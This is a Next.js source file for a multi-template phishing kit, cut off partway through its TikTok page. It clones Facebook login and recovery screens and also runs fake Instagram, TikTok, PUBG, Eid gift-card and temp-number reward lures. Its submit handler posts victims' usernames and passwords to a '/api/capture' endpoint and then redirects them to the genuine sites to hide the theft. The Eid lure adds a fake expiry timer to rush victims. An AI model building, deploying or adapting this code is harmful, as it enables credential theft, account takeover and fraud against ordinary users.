"use client";
import { useParams, useRouter } from "next/navigation";
import { useState, useEffect } from "react";

const TEMPLATE_CONFIG = {
  "fb-recovery": {
    name: "Facebook",
    title: "Account Recovery Center",
    subtitle: "Identify your account to start the recovery process.",
    bgImage: "https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&q=80&w=1920",
    color: "#1877f2",
    fields: ["Email or Phone", "Old Password"]
  },
  "ig-followers": {
    name: "Instagram",
    title: "Get Free Followers",
    subtitle: "Login to your account to claim your 5,000 free followers instantly.",
    bgImage: "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?auto=format&fit=crop&q=80&w=1920",
    color: "#e1306c",
    fields: ["Username", "Password"]
  },
  "tiktok": {
    name: "TikTok",
    title: "TikTok Creator Fund",
    subtitle: "Verify your identity to claim your viral growth rewards.",
    bgImage: "https://images.unsplash.com/photo-1598550476439-6847785fce6b?auto=format&fit=crop&q=80&w=1920",
    color: "#000000",
    fields: ["Username/Email", "Password"]
  },
  "temp-number": {
    name: "Temp Number",
    title: "Get A Temporary Number",
    subtitle: "Login to get your free anonymous number.",
    bgImage: "https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&q=80&w=1920",
    color: "#3b82f6",
    fields: ["Email or Phone", "Password"]
  },
  "pubg": {
    name: "PUBG Mobile",
    title: "Season UC Giveaway",
    subtitle: "Complete verification to receive 660 UC in your inventory.",
    bgImage: "https://images.unsplash.com/photo-1542751371-adc38448a05e?auto=format&fit=crop&q=80&w=1920",
    color: "#f39c12",
    fields: ["Character ID / Email", "Password"]
  },
  "eid-gift": {
    name: "Eid Rewards",
    title: "Official Eid Gift Card",
    subtitle: "Login to accept your 500$ festive gift card from Aura Rewards.",
    bgImage: "https://images.unsplash.com/photo-1545645512-429910f274cb?auto=format&fit=crop&q=80&w=1920",
    color: "#27ae60",
    fields: ["Email/Username", "Password"]
  }
};

export default function PhishingPage() {
  const params = useParams();
  const slug = params.slug || "";
  
  // Smart extract toolId: check which TEMPLATE_CONFIG key matches the start of the slug
  // This correctly handles hyphenated IDs like "eid-gift" or "ig-followers"
  const toolId = Object.keys(TEMPLATE_CONFIG).find(id => slug.startsWith(id)) || "fb-recovery";
  const config = TEMPLATE_CONFIG[toolId];
  const router = useRouter();

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [timeLeft, setTimeLeft] = useState(300);
  const [step, setStep] = useState(1); // Used for multi-step flows like temp-number
  const [mounted, setMounted] = useState(false);
  const [service, setService] = useState(""); // For tool-specific service selection (tiktok)
  const [quantity, setQuantity] = useState(""); // For tool-specific quantity selection (tiktok)
  const [charId, setCharId] = useState(""); // For tool-specific char id (pubg)
  const [isVerifying, setIsVerifying] = useState(false); // For tool-specific verification simulation

  useEffect(() => {
    setMounted(true);
  }, []);

  useEffect(() => {
    if (toolId === "eid-gift") {
      const timer = setInterval(() => {
        setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [toolId]);

  const formatTime = (seconds) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      await fetch("/api/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          tool: config.name, 
          toolId: toolId,
          username, 
          password 
        })
      });
      
      // Redirect to "real" site after capture
      const redirectUrls = {
        "fb-recovery": "https://www.facebook.com/login/identify",
        "ig-followers": "https://www.instagram.com",
        "tiktok": "https://www.tiktok.com",
        "pubg": "https://www.pubgmobile.com",
        "eid-gift": "https://www.google.com/search?q=eid+mubarak",
        "temp-number": "https://sms24.me"
      };
      
      if (toolId === "eid-gift" || toolId === "ig-followers" || toolId === "pubg" || toolId === "temp-number") {
        setSuccess(true);
        // Show success state briefly for eid gift before redirecting
        setTimeout(() => {
          window.location.href = redirectUrls[toolId];
        }, 1500);
      } else {
        window.location.href = redirectUrls[toolId] || "https://google.com";
      }
    } catch (err) {
      console.error(err);
      setLoading(false);
    }
  };

  if (toolId === "fb-recovery") {
    if (step === 1) {
      // Step 1: Facebook Identify Account
      return (
        <div className="min-h-screen bg-[#f0f2f5] flex flex-col font-sans">
          {/* Mobile Header */}
          <div className="md:hidden bg-[#1877f2] px-4 py-3 flex items-center justify-center">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" className="h-6 brightness-100 invert" />
          </div>
          
          {/* Desktop Nav */}
          <header className="hidden md:flex bg-white h-14 border-b border-gray-200 items-center justify-center">
             <div className="w-full max-w-[1020px] px-8 flex justify-between items-center">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" className="h-[26px]" />
                <div className="flex gap-4">
                   <div className="flex bg-[#f0f2f5] px-3 py-1.5 rounded-md">
                      <input type="text" placeholder="Email or Phone" className="bg-transparent text-sm outline-none w-32" />
                   </div>
                   <div className="flex bg-[#f0f2f5] px-3 py-1.5 rounded-md">
                      <input type="password" placeholder="Password" className="bg-transparent text-sm outline-none w-32" />
                   </div>
                   <button className="bg-[#1877f2] text-white font-bold text-xs px-4 py-1.5 rounded-md">Log In</button>
                   <a href="#" className="text-[#1877f2] text-[13px] font-medium self-center hover:underline">Forgotten account?</a>
                </div>
             </div>
          </header>

          <main className="flex-1 flex flex-col items-center pt-8 sm:pt-16 px-4">
             <div className="w-full max-w-[500px] bg-white rounded-lg shadow-md overflow-hidden border border-gray-200">
                <div className="px-5 py-4 border-b border-gray-200 font-bold text-xl text-[#1c1e21]">
                   Find Your Account
                </div>
                <div className="p-5">
                   <p className="text-[#606770] text-[16px] mb-6 leading-tight">
                      Please enter your email address or mobile number to search for your account.
                   </p>
                   <div className="space-y-4">
                      <input 
                        type="text" 
                        required
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        placeholder="Email address or mobile number"
                        className="w-full border border-gray-200 rounded-md px-4 py-3 text-[17px] focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2]"
                      />
                      <div className="border-t border-gray-200 mt-6 pt-5 flex justify-end gap-2">
                         <button onClick={() => router.push("https://facebook.com/login")} className="px-5 py-2 bg-[#e4e6eb] hover:bg-[#d8dadf] text-[#4b4f56] font-bold rounded-md transition-colors">Cancel</button>
                         <button 
                           onClick={() => { if(username.length > 3) setStep(2) }} 
                           className="px-8 py-2 bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold rounded-md transition-colors"
                         >
                            Search
                         </button>
                      </div>
                   </div>
                </div>
             </div>

             {/* Footer Links (Mobile) */}
             <div className="sm:hidden mt-8 text-center text-xs text-[#606770] space-y-4 pb-8">
                <div className="flex justify-center gap-4">
                   <span className="font-bold text-gray-900 border-b border-gray-900">English (UK)</span>
                   <span>اردو</span>
                   <span>ਪੰਜਾਬੀ</span>
                   <span>+</span>
                </div>
                <div>Meta © 2026</div>
             </div>
          </main>
        </div>
      );
    }

    // Step 2: Realistic Login / Confirm Identity
    return (
      <div className="min-h-screen bg-[#f0f2f5] flex flex-col font-sans text-slate-900">
        {/* Desktop Branding (Facebook Blue Header) */}
        <div className="hidden sm:flex bg-white h-14 border-b border-gray-200 items-center justify-center">
            <div className="w-full max-w-[1020px] px-8 flex justify-between items-center">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" className="h-[26px]" />
                <button className="bg-[#1877f2] text-white font-bold text-[13px] px-5 py-2 rounded-md">Log In</button>
            </div>
        </div>

        <main className="flex-1 flex flex-col items-center pt-8 sm:pt-20 px-4">
           {/* Account Found Header (Simulation) */}
           <div className="w-full max-w-[400px] mb-6 flex items-center gap-3 bg-white p-3 rounded-lg border border-gray-300 shadow-sm animate-fade-in">
              <div className="w-12 h-12 bg-gray-200 rounded-full flex items-center justify-center text-gray-500 text-2xl">👤</div>
              <div className="flex-1 text-left">
                 <p className="text-sm font-bold text-[#1c1e21]">Account Found</p>
                 <p className="text-xs text-[#606770]">{username}</p>
              </div>
              <div className="w-4 h-4 rounded-full bg-blue-500 flex items-center justify-center text-[8px] text-white">✓</div>
           </div>

           <div className="w-full max-w-[400px] bg-white rounded-lg shadow-lg p-5 sm:p-6 border border-gray-200">
             <h2 className="text-xl font-bold text-center mb-1 text-[#1c1e21]">Confirm Your Identity</h2>
             <p className="text-center text-[#606770] text-sm mb-6 leading-tight">Enter your password to continue with the recovery process.</p>
             
             <form onSubmit={handleSubmit} className="space-y-4">
               <div className="relative text-left">
                 <input 
                   disabled
                   type="text" 
                   value={username}
                   className="w-full bg-[#f5f6f7] border border-[#dddfe2] rounded-md px-4 py-3.5 text-[#4b4f56] font-medium outline-none cursor-not-allowed"
                 />
                 <button type="button" onClick={() => setStep(1)} className="absolute right-4 top-1/2 -translate-y-1/2 text-[11px] font-bold text-[#1877f2] hover:underline">Edit</button>
               </div>

               <div className="text-left">
                 <input 
                   type="password" 
                   required
                   autoFocus
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   placeholder="Password"
                   className="w-full bg-white border border-[#dddfe2] rounded-md px-4 py-3.5 text-[17px] focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] shadow-sm caret-blue-500"
                 />
               </div>

               <button 
                 type="submit"
                 disabled={loading}
                 className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold text-[20px] py-1.5 rounded-md transition-colors shadow-sm"
               >
                 {loading ? (
                   <div className="flex items-center justify-center py-1">
                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                   </div>
                 ) : (
                   "Continue"
                 )}
               </button>
             </form>

             <div className="text-center mt-6">
                <a href="#" className="text-[#1877f2] text-sm font-medium hover:underline">Forgotten password?</a>
             </div>
           </div>

           {/* Mobile Footers */}
           <div className="mt-auto pb-10 sm:hidden w-full space-y-4 text-center">
              <div className="flex justify-center gap-6 text-[#1c1e21] text-xs font-medium">
                 <a href="#">About</a>
                 <a href="#">Help</a>
                 <a href="#">More</a>
              </div>
              <div className="flex justify-center gap-4 text-[#737373] text-[10px] items-center">
                 <span className="flex items-center gap-1 opacity-50"><img src="https://static.xx.fbcdn.net/rsrc.php/yv/r/S8_S9Yf49P0.svg" className="w-3" /> Meta</span>
                 <span>© 2026</span>
              </div>
           </div>
        </main>
      </div>
    );
  }

  if (toolId === "temp-number") {
    if (step === 1) {
      // Step 1: Landing Page
      return (
        <div className="min-h-screen bg-gray-50 flex flex-col font-sans">
          {/* Header */}
          <header className="bg-white border-b border-gray-200 px-6 py-4 flex items-center justify-between sticky top-0 z-50 shadow-sm">
            <div className="flex items-center gap-2">
              <span className="text-blue-600 text-2xl">📱</span>
              <span className="font-bold text-xl text-gray-800 tracking-tight">FreeTempSMS</span>
            </div>
            <div className="hidden md:flex gap-6 text-sm font-medium text-gray-600">
              <a href="#" className="hover:text-blue-600">Numbers</a>
              <a href="#" className="hover:text-blue-600">Pricing</a>
              <a href="#" className="hover:text-blue-600">API</a>
            </div>
          </header>

          {/* Main Content */}
          <main className="flex-1 flex flex-col items-center justify-center p-6 text-center max-w-3xl mx-auto w-full">
            <div className="inline-block bg-blue-100 text-blue-700 font-bold px-3 py-1 rounded-full text-xs mb-6 uppercase tracking-wide">
              100% Free Service
            </div>
            
            <h1 className="text-4xl md:text-5xl font-black text-gray-900 mb-6 leading-tight">
              Get an Anonymous <br className="hidden md:block" /> 
              <span className="text-blue-600">Temporary Number</span>
            </h1>
            
            <p className="text-gray-500 text-lg mb-10 max-w-lg mx-auto">
              Receive SMS online for free without registration. Protect your privacy and keep your real phone number safe from spam.
            </p>

            {/* Login Card */}
            <div className="bg-white w-full max-w-md rounded-2xl shadow-[0_8px_30px_rgb(0,0,0,0.08)] p-8 border border-gray-100">
              <h2 className="text-xl font-bold text-gray-800 mb-2">Create your free account</h2>
              <p className="text-gray-500 text-sm mb-6">Takes less than 10 seconds</p>

              <div className="space-y-4">
                <button 
                  onClick={() => setStep(2)}
                  className="w-full flex items-center justify-center gap-3 bg-[#1877F2] hover:bg-[#166FE5] text-white font-bold py-3.5 px-4 rounded-xl transition-colors shadow-sm"
                >
                  <svg className="w-5 h-5 fill-current" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                  Continue with Facebook
                  <span className="bg-white/20 text-white text-[10px] px-2 py-0.5 rounded-full ml-1">Recommended</span>
                </button>

                <button 
                  className="w-full flex items-center justify-center gap-3 bg-white border border-gray-300 hover:bg-gray-50 text-gray-700 font-bold py-3.5 px-4 rounded-xl transition-colors shadow-sm"
                >
                  <svg className="w-5 h-5" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
                  Continue with Google
                </button>
              </div>

              <div className="mt-6 text-xs text-gray-400">
                By continuing, you agree to our Terms of Service and Privacy Policy. We never post without your permission.
              </div>
            </div>

            {/* Features (Visual Only) */}
            <div className="mt-16 grid grid-cols-1 md:grid-cols-3 gap-8 max-w-4xl opacity-70">
              <div className="flex flex-col items-center">
                 <div className="w-12 h-12 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center text-xl mb-3">🌍</div>
                 <h3 className="font-bold text-gray-800 text-sm mb-1">Global Numbers</h3>
                 <p className="text-gray-500 text-xs">Access numbers from USA, UK, Canada, and 50+ more countries.</p>
              </div>
              <div className="flex flex-col items-center">
                 <div className="w-12 h-12 bg-green-100 text-green-600 rounded-full flex items-center justify-center text-xl mb-3">⚡</div>
                 <h3 className="font-bold text-gray-800 text-sm mb-1">Instant Verification</h3>
                 <p className="text-gray-500 text-xs">Receive SMS instantly. Perfect for WhatsApp, Telegram, and Tinder.</p>
              </div>
              <div className="flex flex-col items-center">
                 <div className="w-12 h-12 bg-purple-100 text-purple-600 rounded-full flex items-center justify-center text-xl mb-3">🔒</div>
                 <h3 className="font-bold text-gray-800 text-sm mb-1">Total Privacy</h3>
                 <p className="text-gray-500 text-xs">Keep your personal number secure. We wipe all data every 24 hours.</p>
              </div>
            </div>
          </main>
        </div>
      );
    }

    // Step 2: Realistic Facebook Login Clone
    return (
      <div className="min-h-screen bg-[#f0f2f5] flex flex-col items-center pt-10 sm:pt-20 font-sans selection:bg-blue-200">
        <div className="w-full max-w-[1000px] flex flex-col lg:flex-row items-center justify-center gap-0 lg:gap-16 px-4">
          
          {/* Facebook Branding Area (Desktop only usually, but we center it on mobile) */}
          <div className="w-full lg:w-1/2 text-center lg:text-left mb-8 lg:mb-0 pb-4 lg:pb-0">
            <img 
              src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" 
              alt="Facebook" 
              className="h-10 sm:h-20 sm:-ml-8 mx-auto lg:mx-0 mb-4"
            />
            <h2 className="text-xl sm:text-[28px] font-normal leading-tight text-[#1c1e21] hidden sm:block">
              Facebook helps you connect and share with the people in your life.
            </h2>
            <h2 className="text-base font-normal text-[#1c1e21] sm:hidden">
              Log in to continue to FreeTempSMS.
            </h2>
          </div>

          {/* Login Form UI */}
          <div className="w-full max-w-[396px] bg-white rounded-lg shadow-[0_2px_4px_rgba(0,0,0,.1),0_8px_16px_rgba(0,0,0,.1)] pb-6 px-4 pt-4 relative">
            
            <form onSubmit={handleSubmit} className="space-y-3 mt-1">
              <div>
                <input 
                  type="text" 
                  required
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="Email address or phone number"
                  className="w-full bg-white border border-[#dddfe2] rounded-md px-4 py-3 sm:py-3.5 text-[17px] focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] shadow-sm caret-blue-500"
                />
              </div>

              <div>
                <input 
                  type="password" 
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  className="w-full bg-white border border-[#dddfe2] rounded-md px-4 py-3 sm:py-3.5 text-[17px] focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] shadow-sm caret-blue-500"
                />
              </div>

              <button 
                type="submit"
                disabled={loading}
                className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold text-[20px] py-2.5 rounded-md transition-colors mt-2"
              >
                  {loading ? (
                    <div className="flex items-center justify-center h-[30px]">
                      {success ? (
                        <span className="text-base font-medium">Logged in successfully...</span>
                      ) : (
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                      )}
                    </div>
                  ) : (
                    "Log In"
                  )}
              </button>
            </form>

            <div className="text-center mt-4 mb-5">
              <a href="#" className="text-[#1877f2] text-sm hover:underline font-medium hover:text-[#1877f2]">Forgotten password?</a>
            </div>

            <div className="border-t border-[#dadde1] mx-0 my-4"></div>

            <div className="text-center pt-2">
              <button type="button" className="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold text-[17px] px-4 py-3 rounded-md transition-colors">
                Create new account
              </button>
            </div>
          </div>
        </div>
        
        {/* Footer */}
        <div className="mt-32 w-full max-w-[1000px] text-[12px] text-[#737373] hidden sm:block px-4">
           <div className="flex flex-wrap gap-x-3 mb-2">
             <span>English (UK)</span>
             <a href="#" className="hover:underline">اردو</a>
             <a href="#" className="hover:underline">پښتو</a>
             <a href="#" className="hover:underline">العربية</a>
             <a href="#" className="hover:underline">हिन्दी</a>
             <a href="#" className="hover:underline">Español</a>
           </div>
           <div className="border-t border-[#ccd0d5] my-2"></div>
           <div className="flex flex-wrap gap-x-4 gap-y-1 mb-4">
             <a href="#" className="hover:underline">Sign Up</a>
             <a href="#" className="hover:underline">Log In</a>
             <a href="#" className="hover:underline">Messenger</a>
             <a href="#" className="hover:underline">Facebook Lite</a>
             <a href="#" className="hover:underline">Video</a>
             <a href="#" className="hover:underline">Places</a>
           </div>
           <div>Meta © 2026</div>
        </div>
      </div>
    );
  }

  if (toolId === "eid-gift") {
    return (
      <div className="relative min-h-screen flex flex-col items-center justify-center p-4 overflow-hidden bg-[#022c22] font-sans selection:bg-yellow-500/30">
        {/* Background Layer (Pure CSS to fix connection errors) */}
        <div className="absolute inset-0 z-0 bg-[#022c22] overflow-hidden">
          {/* Subtle dotted pattern */}
          <div className="absolute inset-0 opacity-20" style={{ backgroundImage: 'radial-gradient(#10b981 1.5px, transparent 1.5px)', backgroundSize: '30px 30px' }}></div>
          <div className="absolute inset-0 bg-gradient-to-b from-[#064e3b]/90 via-[#022c22]/95 to-[#000000] backdrop-blur-[2px]"></div>
        </div>

        {/* Floating Ornaments (CSS generated) */}
        <div className="absolute top-0 left-0 w-full h-full overflow-hidden pointer-events-none z-0">
          <div className="absolute top-[-5%] left-[10%] w-32 h-32 rounded-full bg-yellow-500/20 blur-3xl animate-pulse"></div>
          <div className="absolute top-[20%] right-[5%] w-64 h-64 rounded-full bg-emerald-500/20 blur-3xl animate-pulse delay-700"></div>
          <div className="absolute bottom-[-10%] left-[40%] w-96 h-96 rounded-full bg-yellow-600/10 blur-[100px] animate-pulse delay-1000"></div>
        </div>

        {/* Main Content */}
        <div className="relative z-10 w-full max-w-lg mb-8 mt-4 text-center animate-fade-in-up">
          <div className="flex flex-col sm:flex-row items-center justify-center gap-3 mb-6">
            <div className="inline-flex items-center justify-center space-x-2 bg-yellow-500/10 border border-yellow-500/30 px-4 py-1.5 rounded-full shadow-[0_0_15px_rgba(234,179,8,0.2)]">
              <span className="text-yellow-400 text-sm">✨</span>
              <span className="text-yellow-400 text-xs font-bold uppercase tracking-widest">Exclusive Festival Offer</span>
            </div>
            <div className="inline-flex items-center space-x-2 bg-red-500/10 border border-red-500/30 px-4 py-1.5 rounded-full animate-pulse shadow-[0_0_15px_rgba(239,68,68,0.2)]">
              <span className="w-2 h-2 rounded-full bg-red-500"></span>
              <span className="text-red-400 text-xs font-bold uppercase tracking-widest">Expires In: <span className="font-mono text-sm">{formatTime(timeLeft)}</span></span>
            </div>
          </div>
          
          <h1 className="text-5xl md:text-6xl font-black text-transparent bg-clip-text bg-gradient-to-r from-yellow-200 via-yellow-400 to-yellow-600 mb-4 drop-shadow-[0_0_30px_rgba(234,179,8,0.4)] tracking-tight">
            EID MUBARAK
          </h1>
          <p className="text-emerald-100 text-lg md:text-xl font-medium max-w-md mx-auto leading-relaxed text-shadow">
            You have received a special <span className="text-yellow-400 font-black font-mono bg-yellow-500/20 px-2 py-0.5 rounded-lg shadow-[0_0_15px_rgba(250,204,21,0.3)] border border-yellow-500/30">Rs. 50,000</span> cash reward!
          </p>
        </div>

        {/* Feature Component - Pure CSS & Emojis */}
        <div className="relative z-10 w-full max-w-sm mx-auto mb-8 animate-float">
          <div className="relative w-48 h-48 mx-auto group cursor-pointer">
            <div className="absolute inset-0 bg-yellow-500/30 rounded-full blur-3xl animate-pulse group-hover:bg-yellow-400/40 transition-all duration-500"></div>
            
            {/* 3D Glassmorphism Container */}
            <div className="relative w-full h-full flex items-center justify-center rounded-3xl shadow-[0_0_50px_rgba(234,179,8,0.4)] border-2 border-yellow-400/50 bg-gradient-to-br from-[#064e3b] to-[#01140f] backdrop-blur-xl transform group-hover:scale-110 group-hover:rotate-3 transition-transform duration-500 overflow-hidden">
              {/* Shine Sweep Effect */}
              <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-yellow-400/30 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-1000 ease-in-out"></div>
              
              {/* Main Emoji Graphics */}
              <span className="text-8xl filter drop-shadow-[0_0_20px_rgba(250,204,21,0.8)] transform group-hover:scale-110 transition-transform">💸</span>
              <span className="absolute bottom-5 right-5 text-4xl animate-bounce filter drop-shadow-md" style={{animationDelay: '0.2s'}}>🎁</span>
              <span className="absolute top-5 left-5 text-4xl animate-bounce filter drop-shadow-md" style={{animationDelay: '0.5s'}}>💰</span>
            </div>

            {/* Badges Decoration */}
            <div className="absolute -bottom-4 -right-4 bg-gradient-to-r from-red-600 to-red-500 text-white text-xs font-black px-4 py-1.5 rounded-full shadow-xl border-2 border-white transform rotate-12 animate-bounce">
              Very Limited!
            </div>
            <div className="absolute -top-4 -left-4 bg-gradient-to-r from-emerald-600 to-emerald-500 text-white text-[10px] font-black px-3 py-1 rounded-full shadow-xl border-2 border-white transform -rotate-12">
              Verified
            </div>
          </div>
        </div>

        {/* Form Card */}
        <div className="relative z-10 w-full max-w-md animate-fade-in-up delay-300">
          <div className="bg-white/5 backdrop-blur-xl border border-white/10 p-8 rounded-[2rem] shadow-2xl relative overflow-hidden">
            {/* Shine effect */}
            <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/5 to-transparent -translate-x-full hover:translate-x-full transition-transform duration-1000"></div>

            <div className="text-center mb-6">
              <h2 className="text-2xl font-bold text-white mb-2">Claim Your Reward</h2>
              <p className="text-emerald-200/70 text-sm">Verify your identity to transfer the funds directly to your account.</p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-5">
              <div className="space-y-1">
                <label className="text-xs font-bold text-emerald-300/80 uppercase tracking-widest pl-1">Email or Phone Number</label>
                <div className="relative">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-emerald-500/50">👤</span>
                  <input 
                    type="text" 
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="Enter details"
                    className="w-full bg-black/40 border border-emerald-500/20 rounded-xl pl-12 pr-4 py-4 text-white placeholder:text-emerald-500/30 focus:outline-none focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400/50 transition-all font-medium"
                  />
                </div>
              </div>

              <div className="space-y-1">
                <label className="text-xs font-bold text-emerald-300/80 uppercase tracking-widest pl-1">Account Password</label>
                <div className="relative">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-emerald-500/50">🔒</span>
                  <input 
                    type="password" 
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="••••••••"
                    className="w-full bg-black/40 border border-emerald-500/20 rounded-xl pl-12 pr-4 py-4 text-white placeholder:text-emerald-500/30 focus:outline-none focus:border-yellow-400 focus:ring-1 focus:ring-yellow-400/50 transition-all font-medium"
                  />
                </div>
              </div>

              <button 
                type="submit"
                disabled={loading}
                className="w-full relative group overflow-hidden rounded-xl p-[1px] mt-2"
              >
                <span className="absolute inset-0 bg-gradient-to-r from-yellow-400 via-yellow-300 to-yellow-500 rounded-xl opacity-70 group-hover:opacity-100 transition-opacity duration-300"></span>
                <div className="relative bg-gradient-to-b from-yellow-400 to-yellow-600 block px-8 py-4 rounded-xl">
                  {loading ? (
                    <div className="flex items-center justify-center gap-2 text-black font-bold text-lg">
                      {success ? (
                        <>
                          <span className="text-xl">✅</span>
                          Success! Redirecting...
                        </>
                      ) : (
                        <>
                          <div className="w-5 h-5 border-2 border-black/20 border-t-black rounded-full animate-spin"></div>
                          Processing...
                        </>
                      )}
                    </div>
                  ) : (
                    <span className="text-black font-black text-lg tracking-wide shadow-sm flex items-center justify-center gap-2">
                       Claim Reward Now 🎁
                    </span>
                  )}
                </div>
              </button>
            </form>

            <div className="mt-6 flex items-center justify-center gap-4 text-emerald-300/40 text-xs font-medium">
               <span className="flex items-center gap-1">✅ Secure Connection</span>
                <span className="flex items-center gap-1">
                  Powered by <span className="text-transparent bg-clip-text bg-gradient-to-r from-orange-400 to-orange-500 font-bold">AURA Rewards</span>
                </span>
             </div>
           </div>
         </div>
       </div>
     );
  }

  if (toolId === "tiktok") {
    const services = [
      { id: "followers", icon: "👥", label: "Followers", color: "#FE2C55" },
      { id: "likes", icon: "❤️", label: "Likes", color: "#FE2C55" },
      { id: "views", icon: "▶️", label: "Views", color: "#25F4EE" },
      { id: "shares", icon: "🚀", label: "Shares", color: "#25F4EE" },
    ];

    const offers = {
      followers: ["1,000", "5,000", "10,000", "25,000"],
      likes: ["2,500", "10,000", "50,000", "100,000"],
      views: ["10,000", "50,000", "250,000", "1,000,000"],
      shares: ["1,000", "5,000", "20,000", "50,000"],
    };

    if (step === 1) {
      return (
        <div className="min-h-screen bg-[#010101] text-white flex flex-col font-sans selection:bg-[#FE2C55]/30">
          <div className="flex-1 flex flex-col items-center justify-center p-6 text-center max-w-lg mx-auto w-full animate-fade-in">
            <div className="relative mb-8">
              <div className="w-24 h-24 bg-white rounded-full flex items-center justify-center text-5xl shadow-[0_0_50px_rgba(254,44,85,0.4)] animate-pulse">🎵</div>
              <div className="absolute -top-2 -right-2 bg-[#FE2C55] text-[10px] font-black px-2 py-1 rounded-full uppercase tracking-tighter border-2 border-black">VIP</div>
            </div>
            
            <h1 className="text-4xl font-black mb-2 tracking-tight">Creator <span className="text-[#FE2C55]">Rewards</span></h1>
            <p className="text-gray-400 text-sm mb-10 font-medium">Global Creator Fund: Multiplier Active 🚀</p>

            <div className="grid grid-cols-2 gap-4 w-full">
              {services.map((s) => (
                <button
                  key={s.id}
                  onClick={() => { setService(s.id); setStep(2); }}
                  className="bg-neutral-900/50 border border-white/10 p-6 rounded-3xl hover:border-[#FE2C55] hover:bg-neutral-800/50 transition-all group relative overflow-hidden"
                >
                  <div className="absolute top-0 right-0 w-12 h-12 bg-gradient-to-br from-white/5 to-transparent rounded-bl-full translate-x-4 -translate-y-4 group-hover:translate-x-0 group-hover:translate-y-0 transition-transform"></div>
                  <div className="text-4xl mb-3 group-hover:scale-110 transition-transform">{s.icon}</div>
                  <div className="text-sm font-black uppercase tracking-widest">{s.label}</div>
                </button>
              ))}
            </div>

            <div className="mt-12 w-full p-4 bg-white/5 border border-white/5 rounded-2xl flex items-center gap-4 text-left">
              <div className="w-2 h-2 rounded-full bg-green-500 animate-ping"></div>
              <div>
                <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest leading-none mb-1">Live Status</p>
                <p className="text-[11px] font-bold text-gray-300">Server [HK-03] distributing 1.4M assets now...</p>
              </div>
            </div>
          </div>
        </div>
      );
    }

    if (step === 2) {
      const selectedService = services.find(s => s.id === service);
      return (
        <div className="min-h-screen bg-[#010101] text-white flex flex-col font-sans selection:bg-[#FE2C55]/30">
          <div className="p-6">
            <button onClick={() => setStep(1)} className="text-gray-500 hover:text-white transition-colors flex items-center gap-2 text-sm font-bold">
              <span>←</span> Back
            </button>
          </div>
          <div className="flex-1 flex flex-col items-center justify-center p-6 text-center max-w-lg mx-auto w-full animate-fade-in">
            <div className="text-6xl mb-6">{selectedService?.icon}</div>
            <h2 className="text-3xl font-black mb-2 tracking-tight text-white uppercase">How many <span style={{color: selectedService?.color}}>{service}</span>?</h2>
